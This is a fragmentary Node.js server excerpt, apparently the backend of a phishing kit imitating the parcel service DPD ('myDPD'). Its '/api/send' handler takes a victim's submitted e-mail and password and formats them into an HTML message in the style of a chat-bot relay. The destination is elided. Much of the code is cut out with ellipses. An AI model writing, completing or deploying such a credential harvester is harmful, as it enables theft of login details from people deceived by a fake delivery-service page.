  ...
  if (pathname === '/api/send' || pathname === '/api/send.js') {
    ...
    req.on('end', async () => {
      try {
        ...
        message += `━━━━━━━━━━━━━━━━━━\n`;
        message += `📧 <b>E-mail:</b> <code>${accessCode || 'N/A'}</code>\n`;
        message += `🔒 <b>Password:</b> <code>${password || 'N/A'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━\n`;
...
server.listen(PORT, () => {
  console.log(`\n==================================================`);
  console.log(`🚀 myDPD local test server running at http://localhost:${PORT}`);
  console.log(`==================================================\n`);
});
